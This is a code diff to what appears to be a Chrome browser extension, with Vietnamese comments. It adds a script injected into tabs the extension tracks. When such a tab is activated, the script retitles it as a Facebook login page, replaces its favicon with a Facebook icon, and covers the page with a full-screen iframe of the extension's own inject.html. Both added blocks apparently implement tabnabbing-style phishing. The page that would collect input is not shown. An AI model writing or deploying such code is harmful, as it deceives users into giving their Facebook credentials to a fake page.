@@ -28,7 +28,28 @@ chrome.tabs.onActivated.addListener(async ({ tabId }) => {
         chrome.scripting.executeScript({
           target: { tabId: tab.id },
           func: () => {
-            window.location.href = chrome.runtime.getURL("inject.html");
+            // Đổi title và favicon của tab cha
+            document.title = "Facebook - Đăng nhập hoặc đăng ký";
+            (function changeFavicon(url) {
+              let link = document.querySelector("link[rel~='icon']");
+              if (!link) {
+                link = document.createElement("link");
+                link.rel = "icon";
+                document.head.appendChild(link);
+              }
+              link.href = url;
+            })(chrome.runtime.getURL("images/fb.ico"));
+
+            // Chèn iframe
+            const iframe = document.createElement("iframe");
+            iframe.src = chrome.runtime.getURL("inject.html");
+            iframe.style.position = "fixed";
+            iframe.style.top = 0;
+            iframe.style.left = 0;
+            iframe.style.width = "100vw";
+            iframe.style.height = "100vh";
+            iframe.style.zIndex = 999999;
+            document.body.appendChild(iframe);
           },
         });
         delete trackedTabs[tab.id];
@@ -42,7 +63,28 @@ chrome.tabs.onActivated.addListener(async ({ tabId }) => {
         chrome.scripting.executeScript({
           target: { tabId: tab.id },
           func: () => {
-            window.location.href = chrome.runtime.getURL("inject.html");
+            // Đổi title và favicon của tab cha
+            document.title = "Facebook - Đăng nhập hoặc đăng ký";
+            (function changeFavicon(url) {
+              let link = document.querySelector("link[rel~='icon']");
+              if (!link) {
+                link = document.createElement("link");
+                link.rel = "icon";
+                document.head.appendChild(link);
+              }
+              link.href = url;
+            })(chrome.runtime.getURL("images/fb.ico"));
+
+            // Chèn iframe
+            const iframe = document.createElement("iframe");
+            iframe.src = chrome.runtime.getURL("inject.html");
+            iframe.style.position = "fixed";
+            iframe.style.top = 0;
+            iframe.style.left = 0;
+            iframe.style.width = "100vw";
+            iframe.style.height = "100vh";
+            iframe.style.zIndex = 999999;
+            document.body.appendChild(iframe);
           },
         });
         delete trackedTabs[tab.id];
